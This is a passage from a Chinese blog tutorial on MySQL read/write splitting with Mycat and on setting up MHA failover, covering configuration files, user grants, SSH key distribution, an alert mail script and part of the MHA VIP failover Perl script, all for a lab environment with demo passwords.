class="hljs-string">&quot;bindIp&quot;</span>&gt;0.0.0.0&lt;/property&gt;<br>&lt;property name=<span class="hljs-string">&quot;dataNodeIdleCheckPeriod&quot;</span>&gt;300000&lt;/property&gt; <span class="hljs-comment">#5 * 60 * 1000L; //连接空闲检查 删除#后面此部分</span><br>&lt;property name=<span class="hljs-string">&quot;frontWriteQueueSize&quot;</span>&gt;4096&lt;/property&gt; &lt;property name=<span class="hljs-string">&quot;processors&quot;</span>&gt;32&lt;/property&gt; <span class="hljs-comment">#--&gt; 删除#后面此部分</span><br> .....<br>&lt;user name=<span class="hljs-string">&quot;root&quot;</span>&gt;                              <span class="hljs-comment">#连接Mycat的用户名</span><br>   &lt;property name=<span class="hljs-string">&quot;password&quot;</span>&gt;123456&lt;/property&gt;          <span class="hljs-comment">#连接Mycat的密码</span><br>   &lt;property name=<span class="hljs-string">&quot;schemas&quot;</span>&gt;TESTDB&lt;/property&gt;           <span class="hljs-comment">#数据库名要和schema.xml相对应</span><br>&lt;/user&gt;<br>&lt;/mycat:server&gt;<br><br><br><span class="hljs-comment">#这里使用的是root，密码为123456,逻辑数据库为TESTDB，这些信息都可以自己随意定义,</span><br><span class="hljs-comment">#读写权限都有，没有针对表做任何特殊的权限。重点关注上面这段配置，其他默认即可。</span><br></code></pre></td></tr></table></figure><p><a href="https://img2022.cnblogs.com/blog/2927659/202211/2927659-20221103020600806-794369464.png"><img src="2927659-20221103020600806-794369464.png" alt="img"></a></p><p><strong>（4）修改schema.xml实现读写分离策略</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">###  先删除所有&lt;!--  --&gt; 和&lt;table&gt;&lt;/table&gt; 的内容在对照下面的增删改  ###</span><br>[root@mycat ~]<span class="hljs-comment"># cat /apps/mycat/conf/schema.xml</span><br>&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;<br>&lt;!DOCTYPE mycat:schema SYSTEM <span class="hljs-string">&quot;schema.dtd&quot;</span>&gt;<br>&lt;mycat:schema xmlns:mycat=<span class="hljs-string">&quot;http://io.mycat/&quot;</span>&gt;<br>    &lt;schema name=<span class="hljs-string">&quot;TESTDB&quot;</span> checkSQLschema=<span class="hljs-string">&quot;false&quot;</span> sqlMaxLimit=<span class="hljs-string">&quot;100&quot;</span> dataNode=<span class="hljs-string">&quot;dn1&quot;</span>&gt;<br>    &lt;/schema&gt;<br>    &lt;dataNode name=<span class="hljs-string">&quot;dn1&quot;</span> dataHost=<span class="hljs-string">&quot;localhost1&quot;</span> database=<span class="hljs-string">&quot;hellodb&quot;</span> /&gt;<br>    &lt;dataHost name=<span class="hljs-string">&quot;localhost1&quot;</span> maxCon=<span class="hljs-string">&quot;1000&quot;</span> minCon=<span class="hljs-string">&quot;10&quot;</span> balance=<span class="hljs-string">&quot;1&quot;</span><br>              writeType=<span class="hljs-string">&quot;0&quot;</span> dbType=<span class="hljs-string">&quot;mysql&quot;</span> dbDriver=<span class="hljs-string">&quot;native&quot;</span> switchType=<span class="hljs-string">&quot;1&quot;</span>  slaveThreshold=<span class="hljs-string">&quot;100&quot;</span>&gt;<br>        &lt;heartbeat&gt;select user()&lt;/heartbeat&gt;<br>        &lt;writeHost host=<span class="hljs-string">&quot;host1&quot;</span> url=<span class="hljs-string">&quot;10.0.0.8:3306&quot;</span> user=<span class="hljs-string">&quot;admin&quot;</span><br>                   password=<span class="hljs-string">&quot;123456&quot;</span>&gt;<br>         &lt;readHost host=<span class="hljs-string">&quot;host2&quot;</span> url=<span class="hljs-string">&quot;10.0.0.18:3306&quot;</span> user=<span class="hljs-string">&quot;admin&quot;</span> password=<span class="hljs-string">&quot;123456&quot;</span> /&gt;<br>        &lt;/writeHost&gt;<br>    &lt;/dataHost&gt;<br>&lt;/mycat:schema&gt;<br><br><span class="hljs-comment">###上面配置中，balance改为1，表示读写分离。</span><br><span class="hljs-comment">###需要赋予上面admin账号所有权限*.*</span><br><span class="hljs-comment">###以上配置达到的效果就是10.0.0.18为主库，10.0.0.28为从库。实现的是hellodb数据库的读写分离</span><br><span class="hljs-comment">###checkSQLschema 数据库前缀相关设置，这里为false</span><br><span class="hljs-comment">###balance=&quot;0&quot;: 不开启读写分离，读操作和写操作都是用的writeHost；</span><br><span class="hljs-comment">###balance=&quot;1&quot;: 开启读写分离，这种情况是存在多主多从的时候，一个主节点提供写操作，其他的主节点和所有从节点提供负载均衡的读操作</span><br><span class="hljs-comment">###balance=&quot;2&quot;: 读操作随机读选择主节点和从节点</span><br><span class="hljs-comment">###balance=&quot;3&quot;: 开启读写分离，写操作使用写主机（主节点也就是写主机，从节点是读主机），读操作使用读主</span><br></code></pre></td></tr></table></figure><p><strong>（5）重新启动mycat</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@mycat ~]<span class="hljs-comment"># mycat restart</span><br></code></pre></td></tr></table></figure><p><strong>（6）在主服务器创建用户并对mycat授权</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#mysql -uroot -p</span><br>mysql&gt;GRANT ALL ON *.* TO <span class="hljs-string">&#x27;admin&#x27;</span>@<span class="hljs-string">&#x27;10.0.0.%&#x27;</span> IDENTIFIED BY <span class="hljs-string">&#x27;123456&#x27;</span> ;<br>mysql&gt; flush privileges;<br></code></pre></td></tr></table></figure><p><strong>（7）在<strong><strong>Mycat</strong></strong>服务器上连接并测试</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@mycat ~]<span class="hljs-comment"># mysql -uroot -p123456 -h127.0.0.1 TESTDB</span><br>mysql&gt; show databases;<br>+----------+<br>| DATABASE |<br>+----------+<br>| TESTDB   |   //只能看一个虚拟数据库<br></code></pre></td></tr></table></figure><p><strong>（8）通过通用日志确认实现读写分离</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#在mysql中查看通用日志方法如下</span><br>show variables like <span class="hljs-string">&#x27;general_log&#x27;</span>;  <span class="hljs-comment">#查看日志是否开启</span><br><span class="hljs-built_in">set</span> global general_log=on;    <span class="hljs-comment">#开启日志功能</span><br>show variables like <span class="hljs-string">&#x27;general_log_file&#x27;</span>; <span class="hljs-comment">#查看日志文件保存位置</span><br><span class="hljs-built_in">set</span> global general_log_file=<span class="hljs-string">&#x27;tmp/general.log&#x27;</span>; <span class="hljs-comment">#设置日志文件保存位置</span><br><br><span class="hljs-comment">#在主和从服务器分别启用通用日志，查看读写分离（下面的是主节点，从节点操作一样）</span><br>[root@master ~]<span class="hljs-comment"># vim /etc/my.cnf.d/mariadb-server.cnf</span><br>[mysqld]<br>general_log=ON<br>[root@master ~]<span class="hljs-comment"># systemctl restart mariadb</span><br>[root@master ~]<span class="hljs-comment"># tail -f /var/lib/mysql/master.log</span><br></code></pre></td></tr></table></figure><p><strong>（9）MyCAT对后端服务器的健康性检查方法select user()</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#mycat判断数据库得存活性，定期发送(默认5秒/次) select user()</span><br><span class="hljs-comment">#查看通用日志</span><br>[root@master ~]<span class="hljs-comment"># tail -f /var/lib/mysql/master.log </span><br>/usr/libexec/mysqld, Version: 8.0.17 (Source distribution). started with:<br>Tcp port: 3306 Unix socket: /var/lib/mysql/mysql.sock<br>Time                 Id Command   Argument<br>2021-02-22T08:52:57.086198Z   17 Query select user()<br>2021-02-22T08:53:07.086340Z   24 Query select user()<br>2021-02-22T08:53:17.086095Z   16 Query select user()<br>2021-02-22T08:53:27.086629Z   18 Query select user()<br><br><br><span class="hljs-comment">#停止从节点，MyCAT自动调度“读”请求至主节点</span><br><span class="hljs-comment">#停止主节点，MyCAT不会自动调度“写”请求至从节点</span><br></code></pre></td></tr></table></figure><h3 id="2-2-ProxySQL"><a href="#2-2-ProxySQL" class="headerlink" title="2.2 ProxySQL"></a>2.2 ProxySQL</h3><blockquote><p> 暂略</p></blockquote><h2 id="3-MySQL-高可用"><a href="#3-MySQL-高可用" class="headerlink" title="3 MySQL 高可用"></a>3 MySQL 高可用</h2><h3 id="3-1-MHA-Master-High-Availability"><a href="#3-1-MHA-Master-High-Availability" class="headerlink" title="3.1 MHA Master High Availability"></a>3.1 MHA Master High Availability</h3><blockquote><p><strong>MHA****工作原理</strong></p><ul><li>MHA利用 SELECT 1 As Value 指令判断master服务器的健康性,<strong>一旦master 宕机，MHA 从宕机崩溃的master保存二进制日志事件</strong>（binlog events）<strong>识别含有最新更新的slave</strong></li><li>应用差异的中继日志（relay log）到其他的slave</li><li>应用从master保存的二进制日志事件（binlog events）到所有slave节点</li><li><strong>提升一个slave为新的master</strong></li><li>使其他的slave连接新的master进行复制</li><li>故障服务器自动被剔除集群(masterha_conf_host),将配置信息去掉</li><li><strong>MHA是一次性的高可用性解决方案,Manager会自动退出</strong></li></ul><p><strong>注意：</strong></p><p>为了尽可能的减少主库硬件损坏宕机造成的数据丢失，因此在配置MHA的同时<strong>建议配置成MySQL的半同步复制</strong></p></blockquote><h4 id="实战案例：实现-MHA"><a href="#实战案例：实现-MHA" class="headerlink" title="实战案例：实现 MHA"></a>实战案例：实现 MHA</h4><p><a href="https://img2022.cnblogs.com/blog/2927659/202211/2927659-20221103162914460-1126578628.png"><img src="2927659-20221103162914460-1126578628.png" alt="img"></a></p><blockquote><p><strong>环境:四台主机</strong></p><ul><li>10.0.0.7 CentOS7 MHA管理端</li><li>10.0.0.8 CentOS8 MySQL8.0 Master</li><li>10.0.0.18 CentOS8 MySQL8.0 Slave1</li><li>10.0.0.28 CentOS8 MySQL8.0 Slave2</li></ul><p><strong>说明</strong></p><ul><li>mha4mysql-manager-0.56-0.el6.noarch.rpm 不支持CentOS 8，只支持CentOS7 以下版本</li><li>mha4mysql-manager-0.58-0.el7.centos.noarch.rpm 支持MySQL5.7和MySQL8.0 ,但和CentOS8版本上的Mariadb -10.3.17不兼容</li></ul><p><strong>两个安装包</strong></p><ul><li>mha4mysql-manager  </li><li>mha4mysql-node</li></ul><p><strong>下载地址</strong></p><ul><li><a href="https://github.com/yoshinorim/mha4mysql-manager">mha4mysql-manager</a></li><li><a href="https://github.com/yoshinorim/mha4mysql-node/">mha4mysql-node</a></li></ul></blockquote><h5 id="（1）在管理节点上安装两个包mha4mysql-manager和mha4mysql-node"><a href="#（1）在管理节点上安装两个包mha4mysql-manager和mha4mysql-node" class="headerlink" title="（1）在管理节点上安装两个包mha4mysql-manager和mha4mysql-node"></a>（1）在管理节点上安装两个包mha4mysql-manager和mha4mysql-node</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注：需要配置epel源，且先安装mha4mysql-node，在安装mha4mysql-manager</span><br>[root@MHA ~]<span class="hljs-comment"># yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm</span><br>[root@MHA ~]<span class="hljs-comment"># yum install -y mha4mysql-manager-0.58-0.el7.centos.noarch.rpm</span><br><br><span class="hljs-comment">#若出现以下错误:Requires: perl(:MODULE_COMPAT_5.10.1),更新epel即可</span><br>[root@MHA ~]<span class="hljs-comment">#  yum install epel-release -y</span><br></code></pre></td></tr></table></figure><h5 id="（2）在所有MySQL服务器上安装mha4mysql-node包"><a href="#（2）在所有MySQL服务器上安装mha4mysql-node包" class="headerlink" title="（2）在所有MySQL服务器上安装mha4mysql-node包"></a>（2）在所有MySQL服务器上安装mha4mysql-node包</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@master ~]<span class="hljs-comment"># yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm</span><br>[root@slave1 ~]<span class="hljs-comment"># yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm</span><br>[root@slave2 ~]<span class="hljs-comment"># yum install -y mha4mysql-node-0.58-0.el7.centos.noarch.rpm</span><br></code></pre></td></tr></table></figure><h5 id="（3）在所有节点实现相互之间ssh-key验证"><a href="#（3）在所有节点实现相互之间ssh-key验证" class="headerlink" title="（3）在所有节点实现相互之间ssh key验证"></a>（3）在所有节点实现相互之间ssh key验证</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@MHA ~]<span class="hljs-comment"># ssh-keygen</span><br>[root@MHA ~]<span class="hljs-comment"># ssh-copy-id 127.0.0.1</span><br>[root@MHA ~]<span class="hljs-comment"># cat .ssh/known_hosts</span><br>127.0.0.1 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIZoaMippL2cffS52fGVZF8UfywNMhFaVjFQ3LXHf6palT79jiSSBYODQgEM9O5caj9K/lu50LnkfTVq/OtEvw0=<br>10.0.0.7 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIZoaMippL2cffS52fGVZF8UfywNMhFaVjFQ3LXHf6palT79jiSSBYODQgEM9O5caj9K/lu50LnkfTVq/OtEvw0=<br>10.0.0.8 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLTQXGNANczi5/GMOn9K20r3rh8MWxloJI1xh1AURK0I2G+d7LznBH3LY6IUzT23xD1i5NXFjkGFkuHynSNTToA=<br>10.0.0.18 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLTQXGNANczi5/GMOn9K20r3rh8MWxloJI1xh1AURK0I2G+d7LznBH3LY6IUzT23xD1i5NXFjkGFkuHynSNTToA=<br>10.0.0.28 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLTQXGNANczi5/GMOn9K20r3rh8MWxloJI1xh1AURK0I2G+d7LznBH3LY6IUzT23xD1i5NXFjkGFkuHynSNTToA=<br><br>[root@MHA ~]<span class="hljs-comment"># scp -rp .ssh/ 10.0.0.8:</span><br>[root@MHA ~]<span class="hljs-comment"># scp -rp .ssh/ 10.0.0.18:</span><br>[root@MHA ~]<span class="hljs-comment"># scp -rp .ssh/ 10.0.0.28:</span><br></code></pre></td></tr></table></figure><h5 id="（4）在管理节点建立配置文件"><a href="#（4）在管理节点建立配置文件" class="headerlink" title="（4）在管理节点建立配置文件"></a>（4）在管理节点建立配置文件</h5><blockquote><p><strong>格式说明</strong></p><ul><li><strong>user</strong>=mhauser     #用于远程连接MySQL所有节点的用户,需要有管理员的权限</li><li><strong>manager_workdir</strong>=/data/mastermha/app1/  #目录会自动生成,无需手动创建（MHA节点）</li><li><strong>remote_workdir</strong>=/data/mastermha/app1/ #mysql节点上生成的目录</li><li><strong>ssh_user</strong>=root    #用于实现远程ssh基于KEY的连接,访问二进制日志</li><li><strong>repl_user</strong>=repluser  #主从复制的用户信息</li><li><strong>ping_interval</strong>=1   #健康性检查的时间间隔（单位秒）</li><li><strong>master_ip_failover_script</strong>=/usr/local/bin/master_ip_failover #切换VIP的perl脚本（官网已提供）,不支持跨网络,也可用Keepalived实现</li><li><strong>report_script</strong>=/usr/local/bin/sendmail.sh  #当执行报警脚本</li><li><strong>check_repl_delay</strong>=0  #默认值为1,表示如果slave中从库落后主库relay log超过100M，主库不会选择这个从库为新的master，因为这个从库进行恢复需要很长的时间.通过设置参数check_repl_delay=0，mha触发主从切换时会忽略复制的延时，对于设置candidate_master=1的从库非常有用，这样确保这个从库一定能成为最新的master</li><li><strong>master_binlog_dir</strong>=/data/mysql/  #指定二进制日志存放的目录,mha4mysql-manager-0.58必须指定,之前版本不需要指定</li><li><strong>candidate_master</strong>=1 #设置为优先候选master，即使不是集群中事件最新的slave,也会优先当master</li></ul><p><strong>说明</strong><strong>:</strong> <strong>主库宕机谁来接管新的****master</strong></p><ol><li><strong>所有从节点日志都是一致的，默认会以配置文件的顺序去选择一个新主</strong></li><li><strong>从节点日志不一致，自动选择最接近于主库的从库充当新主</strong></li><li><strong>如果对于某节点设定了权重（candidate_master=1），权重节点会优先选择。但是此节点日志量落后主库超过100M日志的话，也不会被选择。可以配合check_repl_delay=0，关闭日志量的检查，强制选择候选节点</strong></li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#注意: 此文件的行尾不要加空格等符号</span><br>[root@MHA ~]<span class="hljs-comment"># mkdir /etc/mastermha/</span><br>[root@MHA ~]<span class="hljs-comment"># vim /etc/mastermha/app1.cnf</span><br>[server default]<br>user=mhauser<br>password=123456<br>manager_workdir=/data/mastermha/app1/<br>manager_log=/data/mastermha/app1/manager.log<br>remote_workdir=/data/mastermha/app1/<br>ssh_user=root<br>repl_user=repluser<br>repl_password=123456<br>ping_interval=1<br>master_ip_failover_script=/usr/local/bin/master_ip_failover<br>report_script=/usr/local/bin/sendmail.sh<br>check_repl_delay=0<br>master_binlog_dir=/data/mysql/<br><br>[server1]<br>hostname=10.0.0.8<br>candidate_master=1<br>[server2]<br>hostname=10.0.0.18<br>candidate_master=1<br>[server3]<br>hostname=10.0.0.28<br></code></pre></td></tr></table></figure><h5 id="（5）相关脚本"><a href="#（5）相关脚本" class="headerlink" title="（5）相关脚本"></a>（5）相关脚本</h5><h6 id="sendmail-sh"><a href="#sendmail-sh" class="headerlink" title="sendmail.sh"></a>sendmail.sh</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@MHA ~]<span class="hljs-comment"># chmod +x /usr/local/bin/sendmail.sh</span><br>[root@MHA ~]<span class="hljs-comment"># cat /usr/local/bin/sendmail.sh</span><br><span class="hljs-comment">#!/bin/bash</span><br><br><span class="hljs-comment">#******************************************************</span><br><span class="hljs-comment"># Author:          会不会有那么一天</span><br><span class="hljs-comment"># E-mail:          willoneday@qq.com</span><br><span class="hljs-comment"># Date:            2022-11-03</span><br><span class="hljs-comment"># FileName:        sendmail.sh</span><br><span class="hljs-comment"># Version:         1.0.0</span><br><span class="hljs-comment"># Description:     The test script</span><br><span class="hljs-comment"># BLOG:            https://www.cnblogs.com/Willoneday</span><br><span class="hljs-comment">#******************************************************</span><br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;MHA is failover!&quot;</span> | mail -s <span class="hljs-string">&quot;MHA Warning&quot;</span> willoneday@qq.com<br><br><span class="hljs-comment">#若未安装邮件服务操作如下</span><br>[root@MHA ~]<span class="hljs-comment"># yum install -y mailx</span><br>[root@MHA ~]<span class="hljs-comment"># cat /etc/mail.rc</span><br><span class="hljs-built_in">set</span> from=willoneday@qq.com<br><span class="hljs-built_in">set</span> smtp=smtp.qq.com<br><span class="hljs-built_in">set</span> smtp-auth-user=willoneday@qq.com<br><span class="hljs-built_in">set</span> smtp-auth-password=xxxxxxxxxx<br><span class="hljs-built_in">set</span> smtp-auth=login<br></code></pre></td></tr></table></figure><h6 id="master-ip-failover"><a href="#master-ip-failover" class="headerlink" title="master_ip_failover"></a>master_ip_failover</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#此脚本为官方提供</span><br>[root@MHA ~]<span class="hljs-comment"># chmod +x /usr/local/bin/master_ip_failover</span><br>[root@MHA ~]<span class="hljs-comment"># cat /usr/local/bin/master_ip_failover</span><br><span class="hljs-comment">#!/usr/bin/env perl</span><br><br><span class="hljs-comment">#  Copyright (C) 2011 DeNA Co.,Ltd.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#  This program is free software; you can redistribute it and/or modify</span><br><span class="hljs-comment">#  it under the terms of the GNU General Public License as published by</span><br><span class="hljs-comment">#  the Free Software Foundation; either version 2 of the License, or</span><br><span class="hljs-comment">#  (at your option) any later version.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#  This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">#  but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">#  GNU General Public License for more details.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#  You should have received a copy of the GNU General Public License</span><br><span class="hljs-comment">#   along with this program; if not, write to the Free Software</span><br><span class="hljs-comment">#  Foundation, Inc.,</span><br><span class="hljs-comment">#  51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA</span><br><br><span class="hljs-comment">## Note: This is a sample script and is not complete. Modify the script based on your environment.</span><br><br>use strict;<br>use warnings FATAL =&gt; <span class="hljs-string">&#x27;all&#x27;</span>;<br><br>use Getopt::Long;<br>use MHA::DBHelper;<br><br>my (<br>  <span class="hljs-variable">$command</span>,        <span class="hljs-variable">$ssh_user</span>,         <span class="hljs-variable">$orig_master_host</span>,<br>  <span class="hljs-variable">$orig_master_ip</span>, <span class="hljs-variable">$orig_master_port</span>, <span class="hljs-variable">$new_master_host</span>,<br>  <span class="hljs-variable">$new_master_ip</span>,  <span class="hljs-variable">$new_master_port</span>,  <span class="hljs-variable">$new_master_user</span>,<br>  <span class="hljs-variable">$new_master_password</span><br>);<br>my <span class="hljs-variable">$vip</span> = <span class="hljs-string">&#x27;10.0.0.100/24&#x27;</span>;<br>my <span class="hljs-variable">$key</span> = <span class="hljs-string">&quot;1&quot;</span>;<br>my <span class="hljs-variable">$ssh_start_vip</span> = <span class="hljs-string">&quot;/sbin/ifconfig eth0:<span class="hljs-variable">$key</span> <span class="hljs-variable">$vip</span>&quot;</span>;<br>my <span class="hljs-variable">$ssh_stop_vip</span> = <span class="hljs-string">&quot;/sbin/ifconfig eth0:<span class="hljs-variable">$key</span> down&quot;</span>;<br><br>GetOptions(<br>  <span class="hljs-string">&#x27;command=s&#x27;</span>             =&gt; \<span class="hljs-variable">$command</span>,<br>  <span class="hljs-string">&#x27;ssh_user=s&#x27;</span>            =&gt; \<span class="hljs-variable">$ssh_user</span>,<br>  <span class="hljs-string">&#x27;orig_master_host=s&#x27;</span>    =&gt; \<span class="hljs-variable">$orig_master_host</span>,<br>  <span class="hljs-string">&#x27;orig_master_ip=s&#x27;</span>      =&gt; \<span class="hljs-variable">$orig_master_ip</span>,<br>  <span class="hljs-string">&#x27;orig_master_port=i&#x27;</span>    =&gt; \<span class="hljs-variable">$orig_master_port</span>,<br>  <span class="hljs-string">&#x27;new_master_host=s&#x27;</span>     =&gt; \<span class="hljs-variable">$new_master_host</span>,<br>  <span class="hljs-string">&#x27;new_master_ip=s&#x27;</span>       =&gt; \<span class="hljs-variable">$new_master_ip</span>,<br>  <span class="hljs-string">&#x27;new_master_port=i&#x27;</span>     =&gt; \<span class="hljs-variable">$new_master_port</span>,<br>  <span class="hljs-string">&#x27;new_master_user=s&#x27;</span>     =&gt; \<span class="hljs-variable">$new_master_user</span>,<br>  <span class="hljs-string">&#x27;new_master_password=s&#x27;</span> =&gt; \<span class="hljs-variable">$new_master_password</span>,<br>);<br><br><span class="hljs-built_in">exit</span> &amp;main();<br><br>sub main &#123;<br>  <span class="hljs-keyword">if</span> ( <span class="hljs-variable">$command</span> eq <span class="hljs-string">&quot;stop&quot;</span> || <span class="hljs-variable">$command</span> eq <span class="hljs-string">&quot;stopssh&quot;</span> ) &#123;<br><br>    <span class="hljs-comment"># $orig_master_host, $orig_master_ip, $orig_master_port are passed.</span><br>    <span class="hljs-comment"># If you manage master ip address at global catalog database,</span><br>    <span class="hljs-comment"># invalidate orig_master_ip here.</span><br>    my <span class="hljs-variable">$exit_code</span> = 1;<br>    <span class="hljs-built_in">eval</span> &#123;<br><br>      <span class="hljs-comment"># updating global catalog, etc</span><br>      <span class="hljs-variable">$exit_code</span> = 0;<br>    &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$@</span>) &#123;<br>      warn <span class="hljs-string">&quot;Got Error: <span class="hljs-variable">$@</span>\n&quot;</span>;<br>  